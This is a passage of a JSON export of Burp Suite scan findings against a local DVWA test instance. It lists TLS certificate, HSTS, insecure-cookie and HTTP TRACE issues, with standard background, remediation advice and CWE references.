        "issue__issueDetail": "The following problems were identified with the server's TLS certificate:<ul><li>The server's certificate is not trusted.</li><li>The server's certificate has expired.</li></ul><b>Note:</b> Burp relies on the Java trust store to determine whether certificates are trusted. The Java trust store does not include every root CA certificate that is included within browser trust stores. Burp might incorrectly report that a certificate is not trusted, if a valid root CA certificate is being used that is not included in the Java trust store.<br><br>The server presented the following certificate:<br><br><table><tr><td><b>Issued to:</b>&nbsp;&nbsp;</td><td>localhost</td></tr><tr><td><b>Issued by:</b>&nbsp;&nbsp;</td><td>CN=localhost</td></tr><tr><td><b>Valid from:</b>&nbsp;&nbsp;</td><td>Wed Nov 11 06:48:47 ICT 2009</td></tr><tr><td><b>Valid to:</b>&nbsp;&nbsp;</td><td>Sat Nov 09 06:48:47 ICT 2019</td></tr></table>",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "132": {
        "\ufeffissue__serialNumber": "8.20412E+18",
        "issue__type": "16777984",
        "issue__name": "Strict transport security not enforced",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa",
        "issue__location": "/dvwa",
        "issue__severity": "Low",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p> The application fails to prevent users from connecting  to it over unencrypted connections.  An attacker able to modify a legitimate user's network traffic could bypass the application's use of SSL/TLS encryption, and use the application as a platform for attacks against its users. This attack is performed by rewriting HTTPS links as HTTP, so that if a targeted user follows a link to the site from an HTTP page, their browser never attempts to use an encrypted connection. The sslstrip tool  automates this process. </p>\\n<p>\\nTo exploit this vulnerability, an attacker must be suitably positioned to intercept and modify the victim's network traffic.This scenario typically occurs when a client communicates with the server over an insecure connection such as public Wi-Fi, or a corporate or home network that is shared with a compromised computer. Common defenses such as switched networks are not sufficient to prevent this. An attacker situated in the user's ISP or the application's hosting infrastructure could also perform this attack. Note that an advanced adversary could potentially target any connection made over the Internet's core infrastructure. </p>",
        "issue__remediationBackground": "<p>The application should instruct web browsers to only access the application using HTTPS. To do this, enable HTTP Strict Transport Security (HSTS) by adding a response header with the name 'Strict-Transport-Security' and the value 'max-age=expireTime', where expireTime is the time in seconds that browsers should remember that the site should only be accessed using HTTPS. Consider adding the 'includeSubDomains' flag if appropriate.</p>\\n<p>Note that because HSTS is a &quot;trust on first use&quot; (TOFU) protocol, a user who has never accessed the application will never have seen the HSTS header, and will therefore still be vulnerable to SSL stripping attacks. To mitigate this risk, you can optionally add the 'preload' flag to the HSTS header, and submit the domain for review by browser vendors.</p>",
        "issue__references": "<ul>\\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/HTTP_strict_transport_security\">HTTP Strict Transport Security</a></li>\\n<li><a href=\"https://github.com/moxie0/sslstrip\">sslstrip</a></li>\\n<li><a href=\"https://hstspreload.appspot.com/\">HSTS Preload Form</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/523.html\">CWE-523: Unprotected Transport of Credentials</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/94.html\">CAPEC-94: Man in the Middle Attack</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/157.html\">CAPEC-157: Sniffing Attacks</a></li>\\n</ul>",
        "issue__issueDetail": "This issue was found in multiple locations under the reported path.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "133": {
        "\ufeffissue__serialNumber": "7.04018E+18",
        "issue__type": "5243392",
        "issue__name": "TLS cookie without secure flag set",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/",
        "issue__location": "/dvwa/",
        "issue__severity": "Medium",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>If the secure flag is set on a cookie, then browsers will not submit the cookie in any requests that use an unencrypted HTTP connection, thereby preventing the cookie from being trivially intercepted by an attacker monitoring network traffic. If the secure flag is not set, then the cookie will be transmitted in clear-text if the user visits any HTTP URLs within the cookie's scope. An attacker may be able to induce this event by feeding a user suitable links, either directly or via another web site. Even if the domain that issued the cookie does not host any content that is accessed over HTTP, an attacker may be able to use links of the form http://example.com:443/ to perform the same attack.</p>\\n<p>To exploit this vulnerability, an attacker must be suitably positioned to eavesdrop on the victim's network traffic. This scenario typically occurs when a client communicates with the server over an insecure connection such as public Wi-Fi, or a corporate or home network that is shared with a compromised computer. Common defenses such as switched networks are not sufficient to prevent this. An attacker situated in the user's ISP or the application's hosting infrastructure could also perform this attack. Note that an advanced adversary could potentially target any connection made over the Internet's core infrastructure.</p>",
        "issue__remediationBackground": "<p>The secure flag should be set on all cookies that are used for transmitting sensitive data when accessing content over HTTPS. If cookies are used to transmit session tokens, then areas of the application that are accessed over HTTPS should employ their own session handling mechanism, and the session tokens used should never be transmitted over unencrypted communications.</p>",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/614.html\">CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute</a></li>\\n</ul>",
        "issue__issueDetail": "The following cookie was issued by the application and does not have the secure flag set:<ul><li><b>PHPSESSID</b></li></ul>The cookie appears to contain a session token, which may increase the risk associated with this issue. You should review the contents of the cookie to determine its function.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "Session: PHPSESSID",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "134": {
        "\ufeffissue__serialNumber": "3.63795E+18",
        "issue__type": "5245440",
        "issue__name": "HTTP TRACE method is enabled",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/",
        "issue__location": "/",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>The HTTP TRACE  method is designed for diagnostic purposes. If enabled, the web server will respond to requests that use the TRACE method by echoing in its response the exact request that was received.</p>\\n<p>This behavior is often harmless, but occasionally leads to the disclosure of sensitive information such as internal authentication headers appended by reverse proxies. This functionality could historically be used to bypass the HttpOnly cookie flag on cookies, but this is no longer possible in modern web browsers. </p>",
        "issue__remediationBackground": "<p>The TRACE method should be disabled on production web servers.</p>",
        "issue__references": "<ul>\\n    <li><a href=\"https://portswigger.net/web-security/information-disclosure/exploiting#information-disclosure-due-to-insecure-configuration\">Web Security Academy: Information disclosure via TRACE method</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n</ul>",
        "issue__issueDetail": "",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    }
}